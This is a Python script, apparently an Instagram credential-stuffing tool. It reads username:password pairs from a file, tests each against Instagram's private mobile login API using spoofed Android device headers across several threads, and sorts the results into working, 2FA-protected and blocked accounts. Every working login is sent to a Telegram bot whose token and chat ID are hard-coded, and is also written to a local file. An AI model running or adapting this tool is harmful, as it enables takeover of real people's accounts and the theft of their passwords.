import os, sys, subprocess, webbrowser, time, requests, random, threading, datetime
import json
from uuid import uuid4
import telebot
from telebot import types

Z = '\033[1;31m'  # أحمر
X = '\033[1;33m'  # أصفر
F = '\033[2;32m'  # أخضر

dub = []
uid = str(uuid4())
ID = '5376094649'
TOK = '6669548638:AAG9KeptuOQOoV7EI7tU7NAU_0DinmCdiG4'

# دالة التحقق من وجود الانترنت
def wait_for_internet():
    while True:
        try:
            requests.get("https://www.google.com", timeout=5)
            return
        except:
            print(f"{X}[!] لا يوجد اتصال بالإنترنت.. جاري الانتظار لإعادة الاتصال")
            time.sleep(10)

def safe_request_post(*args, **kwargs):
    wait_for_internet()
    while True:
        try:
            return requests.post(*args, **kwargs)
        except:
            print(f"{X}[!] فشل الطلب.. إعادة المحاولة بعد 10 ثوانٍ")
            time.sleep(10)

def instaa(user, password):
    url = "https://i.instagram.com/api/v1/accounts/login/"
    data = {
        "jazoest": "22384",
        "country_codes": [{"country_code": "964", "source": ["default"]}],
        "phone_id": "93f1da18-850f-46d9-84c4-07e753bcdf22",
        "enc_password": f"#PWD_INSTAGRAM:0:&:{password}",
        "username": user,
        "adid": "da26cdab-8974-4233-b70a-e35c18aa2432",
        "guid": "9e888c62-8663-4544-af04-ee4286bec57d",
        "device_id": "android-59bbb553e55f9281",
        "google_tokens": [],
        "login_attempt_count": "0"
    }
    payload = {"signed_body": f"SIGNATURE.{json.dumps(data)}"}
    wait_for_internet()
    mid = safe_request_post('https://b.i.instagram.com/api/v1/accounts/login/').cookies.get('mid')
    headers = {
        'User-Agent': "Instagram 309.1.0.41.113 Android (29/10; 480dpi; 1080x2139; HUAWEI/HONOR; HRY-LX1T; HWHRY-HF; kirin710; ar_IQ; 541635890)",
        'x-ig-app-locale': "ar_IQ",
        'x-ig-device-locale': "ar_IQ",
        'x-ig-mapped-locale': "ar_AR",
        'x-pigeon-session-id': "UFS-f15e9d0a-ac35-47c8-a9fd-baaae58d1c4f-0",
        'x-pigeon-rawclienttime': "1741526568.254",
        'x-ig-bandwidth-speed-kbps': "235.000",
        'x-ig-bandwidth-totalbytes-b': "755019",
        'x-ig-bandwidth-totaltime-ms': "4409",
        'x-bloks-version-id': "9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a",
        'x-ig-www-claim': "0",
        'x-bloks-is-prism-enabled': "false",
        'x-bloks-is-layout-rtl': "true",
        'x-ig-device-id': "9e888c62-8663-4544-af04-ee4286bec57d",
        'x-ig-family-device-id': "93f1da18-850f-46d9-84c4-07e753bcdf22",
        'x-ig-android-id': "android-59bbb553e55f9281",
        'x-ig-timezone-offset': "10800",
        'x-ig-nav-chain': "",
        'x-fb-connection-type': "WIFI",
        'x-ig-connection-type': "WIFI",
        'x-ig-capabilities': "3brTv10=",
        'x-ig-app-id': "567067343352427",
        'priority': "u=3",
        'accept-language': "ar-IQ, en-US",
        'x-mid': mid,
        'ig-intended-user-id': "0",
        'x-fb-http-engine': "Liger",
        'x-fb-client-ip': "True",
        'x-fb-server-cluster': "True"
    }

    r = safe_request_post(url, data=payload, headers=headers).text
    if 'auth_platform' in r or '"logged_in_user"' in r:
        safe_request_post(f'https://api.telegram.org/bot{TOK}/sendMessage?chat_id={ID}&text={user} : {password} good')
        with open('login.txt', 'a') as file:
            file.write(f'{user}:{password}: good\n')
        print(f'{F}{user}:{password} good')
    elif '"challenge_required"' in r:
        print(f'{X}{user}:{password} : secure')
        with open('secure.txt', 'a') as file:
            file.write(f'{user}:{password}\n')
    elif 'block' in r or 'ip' in r:
        print(f'{Z}{user}:{password} :blocked')
    else:
        print(f'{Z}{user}:{password}')

def username():
    tt = open('mm.txt', 'r', encoding="utf-8").read().splitlines()
    for line in tt:
        if line not in dub:
            dub.append(line)
            user, password = line.strip().split(':')
            return user, password

def users():
    while True:
        user, password = username()
        instaa(user, password)

num_threads = 3
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=users)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
